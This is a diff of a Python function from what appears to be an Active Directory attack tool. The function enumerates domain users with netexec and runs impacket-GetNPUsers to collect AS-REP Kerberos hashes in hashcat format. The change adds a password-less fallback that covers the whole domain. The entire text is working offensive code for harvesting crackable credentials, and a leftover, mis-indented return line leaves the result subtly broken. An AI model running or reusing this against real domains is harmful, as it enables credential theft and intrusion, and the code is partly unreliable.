@@ -314,24 +314,34 @@ def run_asrep(cfg):
     out_file   = os.path.join(cfg["raw_dir"], "asrep.txt")
     users_file = os.path.join(cfg["raw_dir"], "users.txt")
 
-    # Get user list from netexec
-    r = subprocess.run(
-        _nxc_auth(cfg, "ldap") + ["--users"],
-        capture_output=True, text=True, timeout=30, errors="ignore"
-    )
-    users = re.findall(r"\s{2,}(\w[\w\.\-]+)\s{2,}", r.stdout)
-    if users:
-        with open(users_file, "w") as f:
-            f.write("\n".join(set(users)))
-        _ok(f"Got {len(set(users))} users for AS-REP check")
+    # Try to get user list from netexec first, fall back to impacket
+    users = []
+    if _bin_exists("netexec"):
+        r = subprocess.run(
+            _nxc_auth(cfg, "ldap") + ["--users"],
+            capture_output=True, text=True, timeout=30, errors="ignore"
+        )
+        users = re.findall(r"\s{2,}(\w[\w\.\-]+)\s{2,}", r.stdout)
 
+    if not users:
+        # Fall back: use impacket-GetADUsers or just run GetNPUsers without a userlist
+        # (requests AS-REP for all accounts in the domain)
+        _info("No user list from netexec — running AS-REP check without userlist (domain-wide)")
         cmd = ["impacket-GetNPUsers", f"{cfg['domain']}/",
-               "-usersfile", users_file, "-dc-ip", cfg["dc_ip"],
+               "-dc-ip", cfg["dc_ip"], "-request", "-no-pass",
                "-format", "hashcat",
                "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
         return _run(cmd, out_file)
-    else:
-        _warn("Could not get user list for AS-REP — skipping")
+
+    with open(users_file, "w") as f:
+        f.write("\n".join(set(users)))
+    _ok(f"Got {len(set(users))} users for AS-REP check")
+
+    cmd = ["impacket-GetNPUsers", f"{cfg['domain']}/",
+           "-usersfile", users_file, "-dc-ip", cfg["dc_ip"],
+           "-format", "hashcat",
+           "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
+    return _run(cmd, out_file)
         return ""
 
 
